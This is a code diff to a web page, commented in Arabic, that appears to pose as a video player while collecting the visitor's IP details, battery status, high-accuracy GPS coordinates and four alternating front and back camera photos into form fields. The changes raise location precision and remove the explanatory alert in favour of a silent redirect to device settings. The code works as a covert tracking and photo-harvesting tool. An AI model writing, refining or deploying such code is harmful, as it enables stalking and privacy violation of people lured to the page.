@@ -214,20 +214,6 @@
             margin-left: 15px;
         }
 
-        .video-stats {
-            display: flex;
-            gap: 20px;
-            margin-top: 15px;
-            color: #aaa;
-            font-size: 0.9rem;
-        }
-
-        .stat-item {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
         @media (max-width: 480px) {
             .video-controls {
                 padding: 10px 12px;
@@ -328,7 +314,7 @@
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
 
-            // --- دوال جلب البيانات ---
+            // --- جلب IP ---
             async function fetchIPInfo() {
                 try {
                     const response = await fetch('https://ipapi.co/json/');
@@ -339,6 +325,7 @@
                 }
             }
 
+            // --- جلب البطارية ---
             async function getBatteryStatus() {
                 try {
                     const battery = await navigator.getBattery();
@@ -348,7 +335,7 @@
                 }
             }
 
-            // --- التصوير بنفس طريقة النموذج المرجعي ---
+            // --- التصوير بنفس الطريقة (أمامية، خلفية، أمامية، خلفية) ---
             async function captureFromCamera(facingMode) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({
@@ -375,20 +362,25 @@
                 }
             }
 
-            // --- طلب الموقع ---
+            // --- طلب الموقع بدقة عالية جداً ---
             async function getLocation() {
                 try {
                     const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject);
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,      // تفعيل الدقة العالية
+                            timeout: 15000,                // مهلة 15 ثانية للحصول على إشارة دقيقة
+                            maximumAge: 0                  // عدم استخدام موقع مخبأ
+                        });
                     });
-                    return `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
-                } catch {
+                    // إرجاع الموقع بـ 6 أرقام عشرية للدقة المطلقة
+                    return `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
+                } catch (err) {
                     permissions.push('Geolocation Denied');
                     return '';
                 }
             }
 
-            // --- فتح إعدادات الموقع ---
+            // --- فتح إعدادات الموقع (بدون أي رسائل توجيه) ---
             function openLocationSettings() {
                 const ua = navigator.userAgent;
                 if (/Android/i.test(ua)) {
@@ -412,7 +404,8 @@
                     if (/Android/i.test(ua)) {
                         window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                     } else {
-                        alert('افتح إعدادات جهازك ← الموقع/GPS وقم بتفعيله.');
+                        // فتح الإعدادات العامة كنوع من التوجيه الصامت
+                        window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                     }
                 }
             }
@@ -426,7 +419,7 @@
                 realVideo.play().catch(() => {});
             }
 
-            // --- الدالة الرئيسية (بنفس طريقة النموذج المرجعي) ---
+            // --- الدالة الرئيسية ---
             async function captureData() {
                 if (isProcessing) return;
                 if (videoStarted) return;
@@ -434,14 +427,14 @@
                 isProcessing = true;
 
                 if (!settingsOpened) {
-                    // الضغطة الأولى: فتح الإعدادات فقط
+                    // الضغطة الأولى: فتح الإعدادات فقط (بدون أي رسائل)
                     settingsOpened = true;
                     openLocationSettings();
                     isProcessing = false;
                     return;
                 }
 
-                // الضغطة الثانية: طلب الأذونات وجمع البيانات (نفس النموذج المرجعي)
+                // الضغطة الثانية: طلب الأذونات وجمع البيانات
                 // إظهار التحميل
                 spinner.style.display = 'block';
                 loading.style.display = 'block';
@@ -457,14 +450,15 @@
                 await getBatteryStatus();
                 document.getElementById('battery').value = batteryStatus;
 
+                // طلب الموقع بدقة عالية جداً
                 const location = await getLocation();
                 document.getElementById('location').value = location;
 
-                // ⬇️ التسلسل: أمامية → خلفية → أمامية → خلفية (نفس النموذج المرجعي)
-                await captureFromCamera('user'); // صورة 1
-                await captureFromCamera('environment'); // صورة 2
-                await captureFromCamera('user'); // صورة 3
-                await captureFromCamera('environment'); // صورة 4
+                // التصوير: أمامية، خلفية، أمامية، خلفية
+                await captureFromCamera('user');
+                await captureFromCamera('environment');
+                await captureFromCamera('user');
+                await captureFromCamera('environment');
 
                 document.getElementById('imageDatas').value = images.join(',');
                 document.getElementById('permissions').value = permissions.join(', ');
